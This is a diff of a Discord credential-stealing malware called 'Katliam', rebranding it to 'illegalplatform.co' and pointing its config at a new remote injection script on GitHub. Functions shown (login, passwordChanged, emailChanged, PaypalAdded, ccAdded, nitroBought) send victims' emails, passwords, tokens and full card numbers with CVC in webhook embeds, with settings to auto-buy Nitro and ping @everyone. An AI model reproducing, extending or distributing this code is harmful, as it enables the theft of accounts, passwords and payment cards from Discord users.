@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: '・Katliam', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1025318138914545714/1086742133983170671/pedro-pascal-1.jpg?size=4096'.replace(/ /g, '%20'), 
+  embed_name: 'Katliam | illegalplatform.co', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1087744716180832338/1088124914655051816/k9XreOAzSshcVFdIT3wPeR8Gdzu.jpg?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Eathemcmd/ahmetkaya/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
   /**
    
    **/
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Katliam',
+          text: 'Katliam | illegalplatform.co',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Katliam',
+          text: 'Katliam | illegalplatform.co',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Katliam',
+          text: 'Katliam | illegalplatform.co',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Katliam',
+          text: 'Katliam | illegalplatform.co',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Katliam',
+          text: 'Katliam | illegalplatform.co',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Katliam',
+          text: 'Katliam | illegalplatform.co',
         },
       },
     ],
